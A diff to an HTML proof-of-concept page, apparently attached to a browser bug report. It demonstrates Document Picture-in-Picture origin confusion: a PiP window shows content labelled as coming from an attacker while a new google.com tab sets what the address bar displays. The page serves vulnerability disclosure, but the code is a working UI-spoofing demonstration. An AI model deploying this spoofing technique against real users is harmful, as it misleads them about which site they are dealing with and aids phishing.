@@ -1,15 +1,32 @@
 <!doctype html>
 <html><meta charset=utf-8>
 <body>
-<h3>Document PiP - Origin Confusion - Desktop</h3>
+<h3>Document PiP - Origin Confusion - Desktop - NOT dup of 565928741</h3>
+<p>1 click = PiP (requires gesture per spec). 2 = open google.com new tab (normal browsing)</p>
 <button id=a>1. Open PiP (attacker.com)</button>
 <button id=b>2. Open google.com in new tab</button>
 <script>
 let w;
-a.onclick=async()=>{
+document.getElementById('a').onclick=async()=>{
  w=await documentPictureInPicture.requestWindow({width:400,height:250});
- w.document.body.innerHTML=`<style>body{font:16px sans-serif;padding:16px}button{padding:10px}</style><div>Content from bonex1927.github.io</div><button id=x>Click me</button><script>document.getElementById('x').onclick=()=>{let b=document.getElementById('x');b.textContent='Clicked! From attacker.com but bar=google.com';b.style.background='red';b.style.color='white'}<\/script>`;
+ w.document.body.innerHTML=`
+ <style>
+ body{font-family:sans-serif;padding:20px}
+ #x{padding:12px 18px;font-size:16px;cursor:pointer}
+ </style>
+ <h3>ATTACKER CONTENT</h3>
+ <p>From bonex1927.github.io</p>
+ <button id=x>Click me</button>
+ <script>
+ document.getElementById('x').onclick=()=>{
+  let btn=document.getElementById('x');
+  btn.textContent='Clicked! From attacker.com but bar=google.com';
+  btn.style.background='red';
+  btn.style.color='white';
+  btn.style.border='2px solid darkred';
+ }
+ <\/script>`;
 };
-b.onclick=()=>window.open('https://www.google.com','_blank');
+document.getElementById('b').onclick=()=>window.open('https://www.google.com','_blank');
 </script>
 </body></html>
